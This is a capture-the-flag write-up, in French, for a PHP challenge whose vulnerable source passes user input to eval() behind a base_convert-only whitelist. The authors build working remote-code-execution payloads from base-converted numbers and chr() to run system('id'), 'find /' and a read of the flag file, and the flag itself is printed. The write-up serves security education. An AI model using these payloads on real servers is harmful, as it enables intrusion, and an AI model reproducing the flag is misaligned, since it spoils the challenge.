# PHP2
```
200 pts
```

## Description
```
[FR]
J'adore les calculs et la convertion en base, mais connais-tu PHP?

[EN]
I love calcul and base convert, but do you know PHP ?

Author: 5c0r7

http://ctf.hackerlab.bj:1030 http://ctf.hackerlab.bj:1030?source
```

> Pour ce challenge nous disposons d'une application web mais également du code source PHP de ce dernier.

```PHP
<?php error_reporting(0);function h4ck3r($admin_command) {preg_match_all("/([a-z_]+)/", strtolower($admin_command), $words);$words = $words[0];$white = ['base_convert'];$charset = str_split('_abcdefghijklmnopqrstuvwxyz0123456789.+-*/%()[],');var_dump($admin_command);$O_K = true;for ($i = 0; $i < count($words); $i++) {if (strlen($words[$i]) && (array_search($words[$i], $white) === false)) {$O_K = false;}}for ($i = 0; $i < strlen($admin_command); $i++) {if (array_search($admin_command[$i], $charset) === false) {$O_K = false;}}if (strlen($admin_command) > 180) return "Bad H4ck3r, less expression plz!!!";$output = '';if (($O_K) === false) $output = "Attack detected, you're not admin.";else eval('$output=' . $admin_command . ";");return $output;}if (isset($_GET['source'])) {show_source(__FILE__);die();} ?>
```
> Après avoir analyser le code nous avons compris que la fonction *h4ck3r* prend en parametre *admin_command* et verifie si il repond à certains caractéristiques, si c'est le cas il l'envoie à la fonction *eval*.

> Seule la fonction base_convert peut etre executer et notre entrer ne doit pas exéder 180 caractères. Apres quelque recherche nous avons compris comment nous pouvons executer du code php grace aux fonctions mathématiques.

> La premier chose que nous avons fais est d'exécuter la fonction *phpinfo* en utilisant *base_convert*. Nous allons convertir *phpinfo* de la base 36 à la base 10.

<image src="File/php1.png">
  
> Donc ```base_convert(55490343972,10,36)()``` revient à ```phpinfo()```

<image src="File/php2.png">

> On arrive à executer la fonction *phpinfo()*.
> L'objectif maintenant est d'executer les commandes systeme. Nous allons convertir *system* de la base 36 à la base 10 ainsi que *id*
<image src="File/php3.png">
  
> Donc ```system('id')``` est égale à ```base_convert(1751504350,10,36)(base_convert(661,10,36))```

<image src="File/php4.png">
  
> Maintenant que nous arrivons à exécuter les commandes système, nous avons cherché le fichier flag sur le système. Cependant, en raison d'une limitation sur le nombre de caractères, nous ne pouvons pas exécuter des commandes de certaine longueur, car il faut à chaque fois effectuer la conversion dans une base donnée.

> Nous avons alors decidé d'executer la commande ```find /``` pour enumeré tout les fichiers du serveur. Mais cette commande contient un *espace* et un *slash* donc nous allons utilser la fonction ```chr``` de php suivi de leur code ascii respectif. ```' ' = chr(32)``` et ```/ = chr(47)```

<image src="File/php7.png">
  
> Donc ```system('find /')``` revient à ```base_convert(1751504350,10,36)(base_convert(724009,10,36).base_convert(9911,10,28)(32).base_convert(9911,10,28)(47))```.

<image src="File/php8.png">
  
<image src="File/php9.png">
  
> Le fichier flag ce trouve à la racine du serveur nous allons utilsé cette commande pour la lire ```cat /.``` ce qui est egale à ```base_convert(1751504350,10,36)(base_convert(15941,10,36).base_convert(9911,10,28)(32).base_convert(9911,10,28)(47).base_convert(9911,10,28)(46).base_convert(9911,10,28)(42))```

<image src="File/php10.png">

 # Flag

 ```CTF_cOnv3r7_b@5e_c4n_RCE_hehehaaaa``` 🥳
